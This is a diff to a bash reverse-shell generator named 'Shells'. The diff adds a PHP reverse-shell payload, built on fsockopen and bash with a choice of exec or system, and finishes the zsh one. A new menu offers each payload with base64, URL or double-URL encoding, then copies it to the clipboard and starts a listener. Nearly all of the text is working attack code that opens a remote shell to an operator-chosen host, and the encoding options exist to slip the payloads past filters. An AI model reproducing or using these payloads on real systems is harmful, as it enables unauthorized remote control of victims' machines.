@@ -1,7 +1,7 @@
 #!/bin/bash
 #By Andreas Finstad - 4ndr34z
 #Twitter handle: @4nqr34z
-#Shells v.1.2.2
+#Shells v.1.2.3
 
 ### Colors ##
 ESC=$(printf '\033') RESET="${ESC}[0m" BLACK="${ESC}[30m" RED="${ESC}[31m"
@@ -347,9 +347,42 @@ listen
 }
 
 
+
 function zsh () {
 header
 rev="zsh -c 'zmodload zsh/net/tcp && ztcp $IP $PORT && zsh >&\$REPLY 2>&\$REPLY 0>&\$REPLY'"
+
+if [[ $1 == "url" ]] 
+then
+    rev=$(urlencodeme "$rev")
+elif [[ $1 == "urlx2" ]] 
+then
+    rev=$(urlencodeme "$rev")
+    rev=$(urlencodeme "$rev")
+
+elif [[ $1 == "base64" ]] 
+then
+    rev=$(echo -n $rev|$benc --base64url -w0)
+fi
+if [[ $OS == "Darwin" ]]
+then
+   echo -n $rev | pbcopy
+else 
+echo -n $rev | xclip -sel c
+fi
+listen
+}
+
+function php () {
+header
+if [[ $2 == "" ]]
+then
+    exec="exec"
+else
+    exec=$2
+fi
+
+rev="php -r '\$sock=fsockopen(\"$IP\",$PORT);\$c=\"bash <&3 >&3 2>&3\";$exec("\$c");'"
 
 if [[ $1 == "url" ]] 
 then
@@ -498,6 +531,62 @@ Choose an option:  "
         ;;
     esac
 }
+
+submenu_php() {
+header
+    echo -ne "
+$(blueprint 'PHP')
+$(greenprint '1)') exec No encoding
+$(greenprint '2)') exec Base64 encoded
+$(greenprint '3)') exec URL encoded
+$(greenprint '4)') exec Double URL encoded
+$(greenprint '5)') system No encoding
+$(greenprint '6)') system Base64 encoded
+$(greenprint '7)') system URL encoded
+$(greenprint '8)') system Double URL encoded
+$(magentaprint '9)') Go Back to Main Menu
+$(redprint '0)') Exit
+
+Choose an option:  "
+    read -r -n 1 ans
+    case $ans in
+    1)
+        php 
+        ;;
+    2)
+        php "base64"
+        ;;
+    3)
+        php "url"
+        ;;
+    4)
+        php "urlx2"
+        ;;
+    5)
+        php "" "system"
+        ;;
+    6)
+        php "base64" "system"
+        ;;
+    7)
+        php "url" "system"
+        ;;
+    8)
+        php "urlx2" "system"
+        ;;
+    9)
+        mainmenu
+        ;;
+    0)
+        fn_bye
+        ;;
+    
+    *)
+        fn_fail
+        ;;
+    esac
+}
+
 
 submenu_telnet() {
 header
@@ -770,6 +859,7 @@ $(greenprint '5)') Ruby
 $(greenprint '6)') Perl
 $(greenprint '7)') Telnet
 $(greenprint '8)') Zsh
+$(greenprint '9)') PHP
 $(redprint '0)') Exit
 
 Choose an option:  "
@@ -806,6 +896,10 @@ Choose an option:  "
     8)
         input
         submenu_zsh
+        ;;
+    9)
+        input
+        submenu_php
         ;;
     0)
         fn_bye
